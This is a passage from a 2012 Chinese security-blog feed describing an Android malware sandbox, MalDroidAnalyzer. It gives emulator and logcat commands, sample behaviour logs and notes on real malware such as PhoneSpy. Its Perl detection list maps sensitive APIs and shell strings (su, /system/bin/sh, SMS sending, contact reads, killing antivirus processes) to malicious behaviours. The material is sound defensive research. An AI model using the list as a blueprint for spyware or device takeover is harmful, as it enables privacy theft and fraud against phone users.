class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;my %apis = (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;IActivityManager\$Stub\$Proxy\;\-\&amp;gt;shutdown&amp;quot; =&amp;gt; &amp;apos;关机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ActivityManager\;\-\&amp;gt;killBackgroundProcesses&amp;quot; =&amp;gt; &amp;apos;中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManagerNative;-&amp;gt;killBackgroundProcesses&amp;apos; =&amp;gt; &amp;apos;中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManagerNative;-&amp;gt;restartPackage&amp;apos; =&amp;gt; &amp;apos; 中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManager;-&amp;gt;restartPackage&amp;apos; =&amp;gt; &amp;apos; 中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;BluetoothAdapter\;\-\&amp;gt;enable&amp;quot; =&amp;gt; &amp;apos;开启蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;BluetoothSocket\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;IBluetoothPbap\$Stub\$Proxy\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentResolver\;\-\&amp;gt;query&amp;quot; =&amp;gt; &amp;apos;读取联系人、短信等数据库&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentService\;\-\&amp;gt;dump&amp;quot; =&amp;gt; &amp;apos;转储联系人、短信等信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;PackageManager\;\-\&amp;gt;installPackage&amp;quot; =&amp;gt; &amp;apos;安装apk包&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Camera\;\-\&amp;gt;open&amp;quot; =&amp;gt; &amp;apos;开启相机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;MediaRecorder\;\-\&amp;gt;setAudioSource&amp;quot; =&amp;gt; &amp;apos;开启录音功能&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;MediaRecorder\;\-\&amp;gt;setVideoSource&amp;quot; =&amp;gt; &amp;apos;开启视频录制&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;LocationManager\;\-\&amp;gt;getLastKnownLocation&amp;quot; =&amp;gt; &amp;apos;获取地址位置&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Downloads\$ByUri\;\-\&amp;gt;startDownloadByUri&amp;quot; =&amp;gt; &amp;apos;下载文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Downloads\$DownloadBase\;\-\&amp;gt;startDownloadByUri&amp;quot; =&amp;gt; &amp;apos;下载文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;PowerManager\;\-\&amp;gt;reboot&amp;quot; =&amp;gt; &amp;apos;重启手机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Settings\$Bookmarks\;\-\&amp;gt;add&amp;quot; =&amp;gt; &amp;apos;添加浏览器书签&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;TelephonyManager\;\-\&amp;gt;getDeviceId&amp;quot; =&amp;gt; &amp;apos;搜集用户手机IMEI码、电话号码、系统版本号等信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;TelephonyManager\;\-\&amp;gt;getSimSerialNumber()&amp;quot; =&amp;gt; &amp;apos;获取SIM序列号&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Telephony\$Mms\;\-\&amp;gt;query&amp;quot; =&amp;gt; &amp;apos;读取短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;TelephonyManager\;\-\&amp;gt;getLine1Number&amp;quot; =&amp;gt; &amp;apos;获取手机号&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SpeechRecognizer\;\-\&amp;gt;startListening&amp;quot; =&amp;gt; &amp;apos;开启麦克风&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;WifiManager\;\-\&amp;gt;setWifiEnabled&amp;quot; =&amp;gt; &amp;apos;开启WIFI&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;getAllMessagesFromSim&amp;quot; =&amp;gt; &amp;apos;获取sim卡上的短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendDataMessage&amp;quot; =&amp;gt; &amp;apos;发送二进制消息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendMultipartTextMessage&amp;quot; =&amp;gt; &amp;apos;发送彩信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendTextMessage&amp;quot; =&amp;gt; &amp;apos;发送普通短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/FilePart;-&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/Part\;\-\&amp;gt;send&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/Part\;\-\&amp;gt;sendParts&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/StringPart\;\-\&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendMultipartText&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendText&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ITelephony\$Stub\$Proxy\;\-\&amp;gt;call&amp;quot; =&amp;gt; &amp;apos;拔打电话&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/lang/Runtime\;\-\&amp;gt;exec&amp;quot; =&amp;gt; &amp;apos;执行字符串命令&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/HttpURLConnection\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;java/net/URL\;\-\&amp;gt;getContent&amp;quot; =&amp;gt; &amp;apos;获取网页内容&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/URL\;\-\&amp;gt;openConnection&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/URLConnection\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;DefaultHttpClient\;\-\&amp;gt;execute&amp;quot; =&amp;gt; &amp;apos;发送HTTP请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;HttpClient\;\-\&amp;gt;execute&amp;quot; =&amp;gt; &amp;apos;请求远程服务器&amp;apos;,	&amp;apos;android/app/NotificationManager;-&amp;gt;notify&amp;apos; =&amp;gt; &amp;apos;信息通知栏&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsReceiver\;\-\&amp;gt;abortBroadcast&amp;quot; =&amp;gt; &amp;apos;拦截短信接收&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentResolver\;\-\&amp;gt;delete&amp;quot; =&amp;gt; &amp;apos;删除短信、联系人&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;chmod &amp;quot; =&amp;gt; &amp;apos;更改文件权限&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;getRuntime&amp;quot; =&amp;gt; &amp;apos;获取命令行环境&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;apos;content://telephony/carriers&amp;apos; =&amp;gt; &amp;apos;获取所有的APN（网络接入点）配置信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://telephony/carriers/preferapn&amp;apos; =&amp;gt; &amp;apos;可能用于篡改APN（网络接入点）以调用应用市场M-Market扣费接口并验证&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://sms&amp;apos; =&amp;gt; &amp;apos;获取短信数据库&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://browser/bookmarks&amp;apos; =&amp;gt; &amp;apos;获取浏览器书签&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;mount -o remount&amp;apos; =&amp;gt; &amp;apos;重新挂载档案系统&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/system/bin/sh&amp;apos; =&amp;gt; &amp;apos;执行shell&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/proc/mounts&amp;apos; =&amp;gt; &amp;apos;加载文件系统&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/system/bin/cp&amp;apos; =&amp;gt; &amp;apos;复制文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/root/su&amp;apos; =&amp;gt; &amp;apos;切换用户&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;/system/bin/rm &amp;apos; =&amp;gt; &amp;apos;删除文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2、动态分析&quot;&gt;&lt;a href=&quot;#2、动态分析&quot; class=&quot;headerlink&quot; title=&quot;2、动态分析&quot;&gt;&lt;/a&gt;2、动态分析&lt;/h4&gt;&lt;p&gt;动态分析是Android沙盘的主要功能，主要使用Google Android模拟器作为沙盘环境，同时以前面修改过的system.img来启动模拟器，以在操作过程中生成我们所需的日志信息：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system(&amp;apos;start emulator -avd MalDroidAnalyzer -scale 0.8  -system images/root-system.img -ramdisk images/ramdisk.img -kernel images/zImage  -prop dalvik.vm.execution-mode=int:portable &amp;amp;&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的root-system.img是经过root的，默认情况下，Android模拟器是没有root权限的，需要自己手工修改，这个可通过YAFFS2 img浏览器来修改system.img，将su和superuser放置到系统应用目录下，并将build.prop中的ro.config.nocheckin=yes注释掉，将修改后的system.img替换原文件即可。。这样在一些需要root权限的病毒才能正常地模拟器运行，以触发更多的恶意行为。&lt;/p&gt;
&lt;p&gt;启动模拟器后，利用adb安装APK到模拟器上。业界多数沙盘是通过monkey去自动操作软件以触发恶意行为，但这种做法过于盲目，不容易触发恶意行为，同时当操作过于频繁时容易导致程序崩溃，因此在MalDroidAnalyzer中选择由用户自主手工操作，操作时间由用户自己把握。手工操作可能更有利于触发恶意行为，因为病毒作者通常会更多地依赖用户的操作习惯来触发恶意行为，比如点击、拔打电话等行为。&lt;br&gt;为了避免生成过多的无用日志，因此在使用logcat命令时可提前过滤下，并输出到log.txt文件：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system(&amp;quot;adb logcat -v time ActivityManager:I camera:V AudioHardware:D Telephony:V CallNotifier:D su:D MediaProvider:V videocamera:V BluetoothEnabler:V BluetoothHIDService:I dalvikvm:W *:S  &amp;gt; log.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后对生成的日志log.txt进行分析，由于修改过system.img，它会按照json格式输出我们所需的信息，而有些原本Android系统输出的日志可直接拿来作行为检测，就未作修改。日志格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;09-16 10:18:04.583 W/dalvikvm(  299): MalDroid: &amp;#123; &amp;quot;DexClassLoader&amp;quot;: &amp;#123; &amp;quot;path&amp;quot;: &amp;quot;/data/data/com.test/files/anserverb.db&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-16 10:17:27.963 W/dalvikvm(  281): MalDroid: &amp;#123; &amp;quot;SendNet&amp;quot;: &amp;#123; &amp;quot;desthost&amp;quot;: &amp;quot;www.google.com&amp;quot;, &amp;quot;destport&amp;quot;: &amp;quot;80&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;7b2263656c6c5f746f77657273223a5b7b226d6f62696c655f6e6574776f726b5f636f6465223a32362c226c6f636174696f6e5f617265615f636f6465223a2d312c226d6f62696c655f636f756e7472795f636f6465223a3331302c2263656c6c5f6964223a2d317d5d2c22726571756573745f61646472657373223a747275652c22686f7374223a226d6170732e676f6f676c652e636f6d222c2276657273696f6e223a22312e312e30227d&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-09 08:37:10.371 W/dalvikvm(  191): MalDroid: &amp;#123; &amp;quot;CryptoUsage&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;keyalgo&amp;quot;, &amp;quot;key&amp;quot;: &amp;quot;53, 52, 67, 68, 65, 48, 54, 51, 67, 68, 53, 56, 68, 56, 53, 70&amp;quot;, &amp;quot;algorithm&amp;quot;: &amp;quot;AES&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-09 08:37:12.560 W/dalvikvm(  191): MalDroid: &amp;#123; &amp;quot;CryptoUsage&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;encryption&amp;quot;, &amp;quot;algorithm&amp;quot;: &amp;quot;AES/CBC/PKCS5Padding&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;ylmftg6&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:17:14.302 W/dalvikvm(  274): MalDroid: &amp;#123; &amp;quot;ServiceStart&amp;quot;: &amp;#123; &amp;quot;name&amp;quot;: &amp;quot;com.android.md5.Settings&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:24:24.944 W/dalvikvm(  126): MalDroid: &amp;#123; &amp;quot;FdAccess&amp;quot;: &amp;#123; &amp;quot;path&amp;quot;: &amp;quot;2f646174612f646174612f636f6d2e616e64726f69642e6c61756e636865722f66696c65732f6c61756e636865722e707265666572656e636573&amp;quot;, &amp;quot;id&amp;quot;: &amp;quot;588716465&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:24:24.965 W/dalvikvm(  126): MalDroid: &amp;#123; &amp;quot;FileRW&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;read&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;0005&amp;quot;, &amp;quot;id&amp;quot;: &amp;quot;588716465&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成日志后，MalDroidAnalyzer会去分析日志，生成统计图数据，然后生成报告。下面是一些真实病毒样本的恶意行为记录：&lt;/p&gt;
&lt;p&gt;1、窃取通讯录： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;2、通话录音： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;3、发送收费短信：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/5.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;p&gt;4、动态加载类文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;5、Root提权：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;四、-真实案例&quot;&gt;&lt;a href=&quot;#四、-真实案例&quot; class=&quot;headerlink&quot; title=&quot;四、    真实案例&quot;&gt;&lt;/a&gt;四、    真实案例&lt;/h3&gt;&lt;p&gt;在Google Android官方市场上，曾出现过多起应用程序嵌入恶意代码的事件，比如“功夫病毒”，可进行root提权，并破坏文件系统，同时窃取用户隐私信息，感染了上百万用户，危害甚广。病毒作者通过对知名软件进行修改，嵌入恶意代码然后重打包，然后诱骗用户下载这些伪造软件。除“功夫病毒”外，还有DroidDream、AnserverBot、PhoneSpy等恶意软件。下面是MalDroidAnalyzer针对PhoneSpy病毒Gmail.apk给出的分析报告，该病毒会窃取用户隐私信息、通话录音等恶意行为。由于该病毒无GUI界面，而是以后台服务在运行，因此报告中的截图是主页界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/11.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;五、-总结&quot;&gt;&lt;a href=&quot;#五、-总结&quot; class=&quot;headerlink&quot; title=&quot;五、    总结&quot;&gt;&lt;/a&gt;五、    总结&lt;/h3&gt;&lt;p&gt;当前手机用户量增长越来越快，尤其是中国，手机用户量已超10亿，即大约75%的中国人拥有自己的手机。正因为手机越来越智能化，携带也方便，因此许多人将隐私信息存储在手机上，且在多处场景下无形地公开化，而这些信息正是许多病毒作者所热衷的。在移动终端上的安全也将比电脑终端越来越重要，移动安全也已成为安全领域的另一新战场。&lt;/p&gt;
&lt;h3 id=&quot;六、-鸣谢&quot;&gt;&lt;a href=&quot;#六、-鸣谢&quot; class=&quot;headerlink&quot; title=&quot;六、    鸣谢&quot;&gt;&lt;/a&gt;六、    鸣谢&lt;/h3&gt;&lt;p&gt;感谢Dflower同学（0day2作者之一）在笔者编写MalDroidAnalyzer过程中给予的帮助。&lt;/p&gt;
&lt;h3 id=&quot;七、-参考资料&quot;&gt;&lt;a href=&quot;#七、-参考资料&quot; class=&quot;headerlink&quot; title=&quot;七、    参考资料&quot;&gt;&lt;/a&gt;七、    参考资料&lt;/h3&gt;&lt;p&gt;1、    DroidBox：&lt;a href=&quot;http://code.google.com/p/droidbox&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://code.google.com/p/droidbox&lt;/a&gt;&lt;br&gt;2、    SandDroid：&lt;a href=&quot;http://sanddroid.xjtu.edu.cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://sanddroid.xjtu.edu.cn&lt;/a&gt;&lt;br&gt;3、    apktool：&lt;a href=&quot;http://code.google.com/p/android-apktool&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://code.google.com/p/android-apktool&lt;/a&gt;&lt;br&gt;4、    网秦《2012年上半年全球手机安全报告》：&lt;a href=&quot;http://cn.nq.com/neirong/2012shang.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cn.nq.com/neirong/2012shang.pdf&lt;/a&gt;&lt;br&gt;5、    Android权限中文描述大全：&lt;a href=&quot;http://wenku.baidu.com/view/b1f6f9ff0242a8956bece4e7.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wenku.baidu.com/view/b1f6f9ff0242a8956bece4e7.html&lt;/a&gt;&lt;br&gt;6、    Android Permission Map：&lt;a href=&quot;http://www.android-permissions.org/permissionmap.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.android-permissions.org/permissionmap.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;【作者】：riusksk（泉哥）&lt;br&gt;【团队】：腾讯安全应急响应中心&lt;br&gt;【日期】：2012年10月2日&lt;/p&gt;
&lt;h3 id=&quot;一、-前言&quot;&gt;&lt;a href=&quot;#一、-前言&quot; class=&quot;headerlink&quot; title=&quot;一、    前言&quot;&gt;&lt;/a&gt;一、    
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
      <category term="恶意软件" scheme="http://riusksk.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Android软件安全自动化审计</title>
    <link href="http://riusksk.github.io/2012/05/25/android-auto-auditor/"/>
    <id>http://riusksk.github.io/2012/05/25/android-auto-auditor/</id>
    <published>2012-05-24T16:00:00.000Z</published>
    <updated>2016-06-20T10:16:19.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/android_auto_auditor.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/android_auto_auditor.pdf&quot; s
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
